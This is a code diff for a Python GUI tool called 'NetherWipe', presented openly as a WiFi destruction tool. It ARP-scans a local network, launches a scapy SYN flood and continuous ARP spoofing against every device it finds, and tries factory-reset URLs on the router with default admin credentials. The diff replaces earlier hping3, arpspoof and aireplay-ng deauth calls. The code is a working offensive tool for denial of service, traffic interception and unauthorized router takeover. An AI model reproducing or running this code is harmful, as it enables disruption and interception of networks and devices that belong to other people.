@@ -7,14 +7,18 @@ import socket
 import os
 from tkinter import *
 from tkinter import scrolledtext, messagebox
-from scapy.all import ARP, Ether, srp, send
+from scapy.all import IP, TCP, send, srp, ARP, Ether, conf
+import random
+
+conf.verb = 0
 
 class NetherWipe:
     def __init__(self, root):
         self.root = root
-        self.root.title("NetherWipe v1.0")
+        self.root.title("NetherWipe v1.1")
         self.root.geometry("600x500")
         self.root.configure(bg="#1e1e2e")
+        self.running = True
 
         Label(root, text="NetherWipe – WiFi Zerstörungstool", font=("Helvetica", 16, "bold"), bg="#1e1e2e", fg="#ff5555").pack(pady=10)
 
@@ -32,7 +36,7 @@ class NetherWipe:
         self.log_area = scrolledtext.ScrolledText(root, width=70, height=20, bg="#2d2d3a", fg="#00ff99", font=("Courier", 10))
         self.log_area.pack(pady=10)
 
-        self.log("NetherWipe gestartet. Bereit.")
+        self.log("NetherWipe gestartet (kein hping3 – reine scapy DoS)")
 
     def log(self, msg):
         self.log_area.insert(END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
@@ -48,34 +52,49 @@ class NetherWipe:
         ether = Ether(dst="ff:ff:ff:ff:ff:ff")
         packet = ether / arp
         result = srp(packet, timeout=3, verbose=0)[0]
-        devices = [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]
-        return devices
+        return [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]
 
-    def dos_attack(self, target_ip):
-        self.log(f"DoS auf {target_ip} gestartet")
-        cmd = f"hping3 -S --flood --rand-source -p 80 {target_ip} -c 500000 &"
-        subprocess.Popen(cmd, shell=True)
-        time.sleep(30)
-        subprocess.Popen("pkill hping3", shell=True)
+    def syn_flood(self, target_ip, duration=30):
+        """ SYN Flood mit scapy – keine externen Tools """
+        self.log(f"SYN Flood auf {target_ip} für {duration}s")
+        end_time = time.time() + duration
+        sport = random.randint(1024, 65535)
+        while time.time() < end_time and self.running:
+            ip = IP(dst=target_ip)
+            tcp = TCP(sport=sport, dport=80, flags="S", seq=random.randint(1000, 5000))
+            send(ip/tcp, verbose=0, count=1)
+            sport = random.randint(1024, 65535)
 
     def arp_spoof(self, target_ip, router_ip):
-        self.log(f"ARP-Spoofing gegen {target_ip}")
-        subprocess.Popen(f"arpspoof -i en0 -t {target_ip} {router_ip} > /dev/null 2>&1 &", shell=True)
-        subprocess.Popen(f"arpspoof -i en0 -t {router_ip} {target_ip} > /dev/null 2>&1 &", shell=True)
+        """ ARP-Spoofing mit scapy (kein arpspoof Befehl) """
+        self.log(f"ARP-Spoofing gestartet: {target_ip} <-> {router_ip}")
+        # Target MAC finden
+        target_mac = self.get_mac(target_ip)
+        router_mac = self.get_mac(router_ip)
+        if not target_mac or not router_mac:
+            self.log(f"MAC nicht gefunden für {target_ip} oder {router_ip}")
+            return
+        # ARP Antworten senden
+        while self.running:
+            send(ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst=target_mac), verbose=0)
+            send(ARP(op=2, pdst=router_ip, psrc=target_ip, hwdst=router_mac), verbose=0)
+            time.sleep(2)
 
-    def deauth_attack(self, router_mac, iface="en0"):
-        self.log(f"Deauth-Angriff auf {router_mac} – trennt alle Clients")
-        subprocess.Popen(f"aireplay-ng -0 0 -a {router_mac} {iface}", shell=True)
+    def get_mac(self, ip):
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
+        if ans:
+            return ans[0][1].hwsrc
+        return None
 
     def router_reset(self, router_ip):
         import requests
         from requests.auth import HTTPBasicAuth
-        payloads = [f"http://{router_ip}/cgi-bin/reboot?factory=1",
-                    f"http://{router_ip}/reset.htm",
-                    f"http://{router_ip}/goform/reset"]
+        urls = [f"http://{router_ip}/cgi-bin/reboot?factory=1",
+                f"http://{router_ip}/reset.htm",
+                f"http://{router_ip}/goform/reset"]
         defaults = [("admin","admin"), ("admin",""), ("root","admin"), ("user","user")]
-        for url in payloads:
-            for user, pw in defaults:
+        for url in urls:
+            for user,pw in defaults:
                 try:
                     requests.get(url, auth=HTTPBasicAuth(user,pw), timeout=2)
                     self.log(f"Reset versucht: {url}")
@@ -88,28 +107,26 @@ class NetherWipe:
             messagebox.showerror("Fehler", "Bitte Router IP eingeben")
             return
         self.go_button.config(state=DISABLED)
+        self.running = True
         self.log(f"Starte Zerstörung auf Router {router_ip}")
         network = self.get_network_range(router_ip)
-        self.log(f"Scanne Netzwerk {network}")
+        self.log(f"Scanne {network}")
         devices = self.arp_scan(network)
         self.log(f"Gefunden: {len(devices)} Geräte")
+        # Starte Flood auf jedes Gerät
         for dev in devices:
-            threading.Thread(target=self.dos_attack, args=(dev['ip'],)).start()
+            threading.Thread(target=self.syn_flood, args=(dev['ip'], 60)).start()
             threading.Thread(target=self.arp_spoof, args=(dev['ip'], router_ip)).start()
             time.sleep(0.5)
         threading.Thread(target=self.router_reset, args=(router_ip,)).start()
+        self.log("Alle Angriffe gestartet. Systeme werden zerstört.")
 
-        # Versuche Deauth (Monitor Mode benötigt – finde Interface)
-        try:
-            iface = subprocess.getoutput("ifconfig | grep -E '^en[0-9]' | head -1 | cut -d: -f1").strip()
-            router_mac = subprocess.getoutput(f"arp -n | grep {router_ip} | awk '{{print $3}}'")
-            if router_mac and "ae" not in router_mac:
-                threading.Thread(target=self.deauth_attack, args=(router_mac, iface)).start()
-        except:
-            self.log("Deauth nicht möglich – keine kompatible Karte im Monitor Mode")
-        self.log("Alle Angriffe gestartet. Systeme werden jetzt zerstört.")
+    def stop(self):
+        self.running = False
+        self.log("Stoppe Angriffe...")
 
 if __name__ == "__main__":
     root = Tk()
     app = NetherWipe(root)
+    root.protocol("WM_DELETE_WINDOW", app.stop)
     root.mainloop()
